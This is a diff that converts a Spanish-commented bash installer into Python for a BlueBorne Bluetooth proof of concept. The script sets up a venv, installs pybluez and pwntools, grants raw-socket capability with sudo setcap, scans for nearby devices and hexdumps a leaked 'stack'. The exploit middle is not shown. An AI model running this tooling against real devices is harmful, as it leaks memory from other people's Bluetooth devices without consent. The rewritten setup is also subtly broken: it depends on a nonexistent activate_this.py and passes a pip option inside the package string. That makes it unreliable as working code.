@@ -1,47 +1,48 @@
-#!/bin/bash
+import os
+import subprocess
+import sys
 
-# Variables
-VENV_DIR="/home/lup1n/Herramientas/meli"
-TARGET_SCRIPT="blueborne.py"
+# Directorio del entorno virtual en la carpeta actual
+VENV_DIR = "./meli"
 
 # Crear entorno virtual si no existe
-if [ ! -d "$VENV_DIR" ]; then
-    echo "[*] Creando entorno virtual 'meli' en $VENV_DIR"
-    python3 -m venv "$VENV_DIR"
-fi
+if not os.path.isdir(VENV_DIR):
+    print("[*] Creando entorno virtual 'meli'")
+    subprocess.run([sys.executable, "-m", "venv", VENV_DIR])
 
-# Activar el entorno virtual
-echo "[*] Activando el entorno virtual"
-source "$VENV_DIR/bin/activate"
+# Función para activar el entorno virtual en el código
+def activate_virtualenv():
+    activate_script = os.path.join(VENV_DIR, "bin", "activate_this.py")
+    with open(activate_script) as f:
+        exec(f.read(), dict(__file__=activate_script))
 
-# Comprobar e instalar dependencias
-pip_show() {
-    pip show "$1" > /dev/null 2>&1
-}
+activate_virtualenv()
 
-install_dependencies() {
-    echo "[*] Instalando dependencias pybluez y pwntools"
-    pip install git+https://github.com/pybluez/pybluez.git --no-use-pep517
-    pip install pwntools
-}
+# Función para instalar paquetes en el entorno virtual
+def install_package(package):
+    subprocess.run([os.path.join(VENV_DIR, "bin", "pip"), "install", package])
 
-if ! pip_show "pybluez" || ! pip_show "pwntools"; then
-    install_dependencies
-else
-    echo "[*] Dependencias ya están instaladas"
-fi
+# Verificar e instalar dependencias
+def check_and_install():
+    try:
+        import bluetooth
+        import pwn
+        print("[*] Dependencias ya están instaladas")
+    except ImportError:
+        print("[*] Instalando dependencias pybluez y pwntools")
+        install_package("git+https://github.com/pybluez/pybluez.git --no-use-pep517")
+        install_package("pwntools")
+
+check_and_install()
 
 # Configurar permisos para el adaptador Bluetooth
-echo "[*] Configurando permisos de Bluetooth para Python"
-sudo setcap cap_net_raw+eip $(eval readlink -f `which python3`)
+print("[*] Configurando permisos de Bluetooth para Python")
+subprocess.run(["sudo", "setcap", "cap_net_raw+eip", subprocess.check_output(["readlink", "-f", os.path.join(VENV_DIR, "bin", "python3")]).strip().decode()])
 
-# Crear el script de la PoC
-echo "[*] Creando el script de la PoC en $TARGET_SCRIPT"
-cat << 'EOF' > "$TARGET_SCRIPT"
+# Código de la PoC
 from pwn import *
 import bluetooth
 
-# Función para escanear dispositivos Bluetooth cercanos
 def buscar_dispositivos():
     log.info("Escaneando dispositivos Bluetooth...")
     dispositivos = bluetooth.discover_devices(duration=8, lookup_names=True)
@@ -101,9 +102,3 @@ sock.close()
 p.success('Done')
 
 print(hexdump(stack))
-EOF
-
-echo "[*] Script de la PoC creado en $TARGET_SCRIPT"
-echo "[*] Para ejecutar el script, asegúrate de activar el entorno virtual:"
-echo "    source $VENV_DIR/bin/activate"
-echo "    python $TARGET_SCRIPT TARGET=XX:XX:XX:XX:XX:XX"
